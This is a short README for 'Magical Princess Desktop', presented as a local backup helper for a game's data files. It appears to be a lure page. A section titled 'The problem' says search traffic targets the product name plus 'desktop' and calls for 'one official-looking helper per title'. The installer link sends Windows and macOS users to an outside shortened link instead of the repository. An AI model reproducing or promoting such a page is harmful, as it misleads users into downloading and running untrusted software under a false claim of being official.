# Magical Princess Desktop

*Archive Magical Princess files on this machine before you change the install.*

## About

**Magical Princess Desktop** runs on your own PC. Keep Magical Princess data folders on disk: dated copies of config and export files before a patch.

Patches move Magical Princess data paths without warning.

Files stay on the machine that runs the tool. Originals are left alone unless you choose otherwise.

## Editions

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Highlights

- Locates Magical Princess user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## The problem

Search traffic for Magical Princess is the product name plus desktop.

Keep one official-looking helper per title.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.
